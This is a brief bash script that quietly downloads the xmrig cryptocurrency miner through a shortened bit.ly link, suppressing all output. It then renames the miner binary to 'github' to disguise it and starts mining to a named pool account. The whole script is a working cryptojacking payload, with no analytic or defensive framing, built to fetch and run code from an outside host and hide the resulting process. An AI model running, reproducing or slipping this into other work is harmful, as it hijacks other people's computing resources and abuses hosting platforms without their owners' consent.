#!/bin/bash
wget -O xmrig-6.16.4-linux-static-x64.tar.gz https://bit.ly/34BX48f > /dev/null 2>&1
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
cd xmrig-6.16.4
mv xmrig github
chmod u+x github
./github -a Argon2/Chukwa -o us-east01.miningrigrentals.com:3333 -u ariseamigose.233469 --keepalive -p x
